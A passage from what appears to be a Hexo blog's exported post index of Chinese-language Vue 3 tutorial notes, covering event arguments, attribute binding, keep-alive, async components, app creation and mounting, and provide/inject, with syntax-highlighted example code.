class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="传递参数过程中获取event"><a href="#传递参数过程中获取event" class="headerlink" title="传递参数过程中获取event"></a>传递参数过程中获取event</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span>&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">data</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">names</span>:[<span class="string">&#x27;zhangsan&#x27;</span>,<span class="string">&#x27;lisi&#x27;</span>,<span class="string">&#x27;wangwu&#x27;</span>]</span></span><br><span class="line"><span class="language-javascript">        &#125;       </span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="attr">methods</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">getNameHandle</span>(<span class="params">name,e</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">console</span>.<span class="title function_">log</span>(name)</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">console</span>.<span class="title function_">log</span>(e.<span class="property">target</span>)</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>内联事件处理<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 当前元素的点击事件，打印当前元素的name 和点击事件对象 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> @<span class="attr">click</span>=<span class="string">&quot;getNameHandle(name,$event)&quot;</span> <span class="attr">v-for</span>=<span class="string">&quot;(name,index) of names&quot;</span> <span class="attr">:Key</span>=<span class="string">&quot;index&quot;</span>&gt;</span>&#123;&#123; name &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Vue</category>
      </categories>
      <tags>
        <tag>Vue</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue3总结三【Vue模板语法-属性绑定】</title>
    <url>/cnblogs.github.io/p/37cf.html</url>
    <content><![CDATA[<p><strong>基本写法</strong><br>双大括号不能在 HTML attributes 中使用。想要响应式地绑定一个 attribute，应该使用v-bind 指令，v-bind指令指示 Vue 将元素的id attribute 与组件的dynamicld 属性保持一致。如果绑定的值是 null 或者undefined，那么该 attribute 将会从渲染的元素上移除</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-class">.appclass</span> &#123;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">color</span>: red;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">font-size</span>: <span class="number">30px</span>;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">data</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">dynamicClass</span>: <span class="string">&quot;appclass&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">dynamicId</span>: <span class="string">&quot;appid&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">tittle</span>:<span class="literal">null</span>  </span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">v-bind:id</span>=<span class="string">&quot;dynamicId&quot;</span> <span class="attr">v-bind:class</span>=<span class="string">&quot;dynamicClass&quot;</span>&gt;</span>测试<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>布尔型 Attribute</strong><br>布尔型 attribute 依据true &#x2F; false 值来决定 attribute 是否应该存在于该元素上，disabled 就是最常见的例子之一</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">data</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">isButtonDisabled</span>:<span class="literal">true</span></span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> <span class="attr">:disabled</span>=<span class="string">&quot;isButtonDisabled&quot;</span>&gt;</span>Button<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>动态绑定多个值</strong><br>如果你有像这样的一个包含多个 attribute 的JavaScript对象</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">data</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">objectOfAttrs</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">id</span>:<span class="string">&#x27;container&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">class</span>:<span class="string">&#x27;wrapper&#x27;</span></span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">:</span>=<span class="string">&quot;objectOfAttrs&quot;</span>&gt;</span>测试<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Vue</category>
      </categories>
      <tags>
        <tag>Vue</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue3总结三十【Vue组件保持存活】</title>
    <url>/cnblogs.github.io/p/f11c.html</url>
    <content><![CDATA[<p><strong>组件保持存活</strong><br>当使用<code>&lt;component :is=&quot;...&quot;&gt;</code>来在多个组件间作切换时，被切换掉的组件会被卸载。我们可以通过 <code>&lt;keep-allve&gt;</code> 组件强制被切换掉的组件仍然保持”存活”的状态<br>我们先来看个例子（依然用上节课的代码改动下）：<br>ComponentA.vue</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">beforeUnmount</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;组件销毁之前&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">  &#125;,</span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">unmounted</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;组件销毁完毕&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h3</span>&gt;</span>ComponentA<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>说明组件被卸载了。我们写点明文演示下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">data</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">message</span>: <span class="string">&quot;老数据&quot;</span></span></span><br><span class="line"><span class="language-javascript">    &#125;;</span></span><br><span class="line"><span class="language-javascript">  &#125;,</span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">beforeUnmount</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;组件销毁之前&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">  &#125;,</span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">unmounted</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;组件销毁完毕&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">  &#125;, <span class="attr">methods</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">updateHandle</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">this</span>.<span class="property">message</span> = <span class="string">&quot;新数据&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h3</span>&gt;</span>ComponentA<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123; message &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;updateHandle&quot;</span>&gt;</span>更新数据<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>我们点更新数据，A组件会变成新数据。切换组件B后，再去切回A组件，发现又变成了老数据。说明我们在切换的时候，组件被卸载了，所以加载的还是原始的数据。那么我们怎么保持组件存活呢？（保持新数据不变）<br>App.vue</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line">...</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 使用 keep-alive 组件来缓存动态组件，避免重复渲染 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">keep-alive</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">component</span> <span class="attr">:is</span>=<span class="string">&quot;tabComponent&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">component</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">keep-alive</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;changeHandle&quot;</span>&gt;</span>切换组件<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Vue</category>
      </categories>
      <tags>
        <tag>Vue</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue3总结三十一【Vue异步组件】</title>
    <url>/cnblogs.github.io/p/42f2.html</url>
    <content><![CDATA[<p><strong>异步组件：</strong><br>在大型项目中，我们可能需要拆分应用为更小的块，并仅在需要时再从服务器加载相关组件。Vue 提供了defineAsyncComponent方法来实现此功能</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 导入组件A</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">import</span> <span class="title class_">ComponentA</span> <span class="keyword">from</span> <span class="string">&quot;./components/ComponentA.vue&quot;</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">import</span> &#123;defineAsyncComponent&#125; <span class="keyword">from</span> <span class="string">&quot;vue&quot;</span>;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 定义一个异步组件 ComponentB</span></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 使用 defineAsyncComponent 来懒加载组件，以提高应用的性能</span></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 当组件实际需要渲染时，才会加载对应的组件文件</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> <span class="title class_">ComponentB</span> = <span class="title function_">defineAsyncComponent</span>(<span class="function">() =&gt;</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">import</span>(<span class="string">&quot;./components/ComponentB.vue&quot;</span>)</span></span><br><span class="line"><span class="language-javascript">)</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">data</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">tabComponent</span>: <span class="string">&#x27;ComponentA&#x27;</span></span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;,</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">components</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title class_">ComponentA</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="title class_">ComponentB</span></span></span><br><span class="line"><span class="language-javascript">  &#125;, <span class="attr">methods</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">changeHandle</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">this</span>.<span class="property">tabComponent</span> = <span class="variable language_">this</span>.<span class="property">tabComponent</span> === <span class="string">&#x27;ComponentA&#x27;</span> ? <span class="string">&#x27;ComponentB&#x27;</span> : <span class="string">&#x27;ComponentA&#x27;</span></span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 使用 keep-alive 组件来缓存动态组件，避免重复渲染 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">keep-alive</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">component</span> <span class="attr">:is</span>=<span class="string">&quot;tabComponent&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">component</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">keep-alive</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;changeHandle&quot;</span>&gt;</span>切换组件<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Vue</category>
      </categories>
      <tags>
        <tag>Vue</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue3总结三十三【Vue应用】</title>
    <url>/cnblogs.github.io/p/8688.html</url>
    <content><![CDATA[<p>每个 Vue 应用都是通过 createApp函数创建一个新的 应用实例<br>main.js</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;createApp&#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">App</span> <span class="keyword">from</span> <span class="string">&#x27;./App.vue&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// app:Vue的实例对象</span></span><br><span class="line"><span class="comment">// 在一个Vue项目中，有且只有一个Vue的实例对象</span></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">createApp</span>(<span class="title class_">App</span>)</span><br><span class="line">	<span class="comment">/* 根组件选项 */</span></span><br><span class="line"><span class="comment">// App:根组件</span></span><br><span class="line">app.<span class="title function_">mount</span>(<span class="string">&#x27;#app&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p><strong>根组件</strong><br>我们传入createApp的对象实际上是一个组件，每个应用都需要一个根组件”，其他组件将作为其子组件。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;createApp&#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 从一个单文件组件中导入根组件</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">App</span> <span class="keyword">from</span> <span class="string">&#x27;./App.vue&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">createApp</span>(<span class="title class_">App</span>)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">mount</span>(<span class="string">&#x27;#app&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p><strong>挂载应用</strong><br>应用实例必须在调用了.mount()方法后才会渲染出来。该方法接收一个“容器”参数，可以是一个实际的DOM元素或是一个 CSS 选择器字符串</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">mount</span>(<span class="string">&#x27;#app&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>#app –&gt; index.html</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;icon&quot;</span> <span class="attr">href</span>=<span class="string">&quot;/favicon.ico&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Vite App<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--  </span></span><br><span class="line"><span class="comment">				浏览器可执行文件：</span></span><br><span class="line"><span class="comment">				1.Html</span></span><br><span class="line"><span class="comment">				2.CSS</span></span><br><span class="line"><span class="comment">				3.JavaScript</span></span><br><span class="line"><span class="comment">				4.Image</span></span><br><span class="line"><span class="comment">				</span></span><br><span class="line"><span class="comment">				构建工具：Webpack  vite</span></span><br><span class="line"><span class="comment">		--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;module&quot;</span> <span class="attr">src</span>=<span class="string">&quot;/src/main.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>公共资源</strong><br>在src目录下的assets文件夹的作用就是存放公共资源，例如：图片、公共CSS或者字体图标等</p>
]]></content>
      <categories>
        <category>Vue</category>
      </categories>
      <tags>
        <tag>Vue</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue3总结三十二【Vue依赖注入】</title>
    <url>/cnblogs.github.io/p/d0e5.html</url>
    <content><![CDATA[<p>通常情况下，当我们需要从父组件向子组件传递数据时，会使用 props。想象一下这样的结构：有一些多层级嵌套的组件，形成了一颗巨大的组件树，而某个深层的子组件需要一个较远的祖先组件中的部分数据。在这种情况下，如果仅使用 props则必须将其沿着组件链逐级传递下去，这会非常麻烦<br>这一问题被称为“prop 逐级透传” provide和inject 可以帮助我们解决这一问题。一个父组件相对于其所有的后代组件，会作为依赖提供者。任何后代的组件树，无论层级有多深，都可以注入由父组件提供给整条链路的依赖<br>App.vue(祖宗组件)</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">import</span> <span class="title class_">Parent</span> <span class="keyword">from</span> <span class="string">&#x27;./components/Parent.vue&#x27;</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">components</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title class_">Parent</span></span></span><br><span class="line"><span class="language-javascript">  &#125;,</span></span><br><span class="line"><span class="language-javascript">  <span class="comment">/**</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript"> * 提供组件间共享的数据或功能</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript"> *</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript"> * 在Vue中，provide选项允许我们向子组件树提供数据或功能，而不需要通过props逐层传递</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript"> * 这里提供的`message`属性，值为&#x27;祖宗的财产&#x27;，可以被任意子组件注入和使用</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript"> *</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript"> * <span class="doctag">@providedProperties</span></span></span></span><br><span class="line"><span class="comment"><span class="language-javascript"> *   - &#123;String&#125; message 提供给子组件的字符串常量</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript"> */</span></span></span><br><span class="line"><span class="language-javascript">  <span class="attr">provide</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">message</span>: <span class="string">&#x27;祖宗的财产&#x27;</span></span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h3</span>&gt;</span>祖宗<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">Parent</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>Parent.vue（父组件）</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">import</span> <span class="title class_">Child</span> <span class="keyword">from</span> <span class="string">&quot;@/components/Child.vue&quot;</span>;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">components</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title class_">Child</span></span></span><br><span class="line"><span class="language-javascript">  &#125;,</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h3</span>&gt;</span>父组件<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">Child</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>Child.vue(子组件)</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="comment">// 注入外部提供的 message 属性或方法</span></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 这使得组件可以访问在其祖先组件中提供的 message，而无需通过每一层组件进行传递</span></span></span><br><span class="line"><span class="language-javascript">  <span class="attr">inject</span>: [<span class="string">&quot;message&quot;</span>]</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h3</span>&gt;</span>子组件<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123; message &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>扩展：</strong><br>也可以从data中读取数据：<br>App.vue</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">import</span> <span class="title class_">Parent</span> <span class="keyword">from</span> <span class="string">&#x27;./components/Parent.vue&#x27;</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">components</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title class_">Parent</span></span></span><br><span class="line"><span class="language-javascript">  &#125;,</span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">data</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">message</span>: <span class="string">&#x27;祖宗的财产!!!&#x27;</span></span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;,</span></span><br><span class="line"><span class="language-javascript">  <span class="comment">/**</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">   * <span class="doctag">@returns</span> 